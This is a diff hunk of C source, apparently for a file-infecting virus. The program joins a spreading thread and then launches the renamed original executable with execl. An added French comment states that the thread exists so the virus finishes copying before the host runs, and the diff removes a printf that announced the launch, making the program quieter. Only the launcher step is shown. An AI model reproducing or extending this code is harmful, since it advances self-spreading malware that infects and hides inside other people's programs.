@@ -242,11 +242,11 @@ int main(int argc, char *argv[]) {
             printf("Error creating old filename.\n");
             return 1;
         }
-        printf("Launching original executable: %s\n", old_name);
         if (access(old_name, F_OK) != 0) {
             printf("Original executable not found: %s\n", old_name);
             return 1;
         }
+        //thread terminé ici sinon le virus serait encore en train de copier le fichier pendant que le .old est lancé, empecherais le déploiment du virus
         pthread_join(t, NULL);
         execl(old_name, old_name, NULL);
         perror("execl");
